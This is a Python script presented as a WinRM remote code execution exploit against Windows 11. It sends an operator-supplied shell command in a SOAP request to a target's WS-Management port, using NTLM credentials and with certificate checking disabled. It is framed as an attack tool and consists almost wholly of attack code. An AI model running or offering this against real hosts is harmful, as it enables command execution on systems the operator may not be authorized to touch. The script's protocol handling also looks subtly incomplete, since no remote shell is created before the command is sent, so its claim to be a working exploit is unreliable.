# STUA-X: WINRM REMOTE CODE EXECUTION (Windows 11)
import requests
import sys
from requests_ntlm import HttpNtlmAuth

def exploit(target_ip, username, password, command):
    url = f"https://{target_ip}:5986/wsman"
    headers = {
        "Content-Type": "application/soap+xml;charset=UTF-8",
        "User-Agent": "Microsoft WinRM Client"
    }

    # SOAP payload for command execution
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
        <a:MessageID>uuid:00000000-0000-0000-0000-000000000000</a:MessageID>
        <a:ReplyTo>
            <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
        </a:ReplyTo>
        <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
        <a:To>/wsman</a:To>
        <w:OperationTimeout>PT60S</w:OperationTimeout>
    </s:Header>
    <s:Body>
        <rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
            <rsp:Command>{command}</rsp:Command>
        </rsp:CommandLine>
    </s:Body>
</s:Envelope>"""

    # Send request
    response = requests.post(
        url,
        headers=headers,
        data=payload,
        auth=HttpNtlmAuth(username, password),
        verify=False
    )

    print(f"[+] Command executed on {target_ip}")
    print(response.text)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <target_ip> <username> <password> <command>")
        sys.exit(1)

    exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])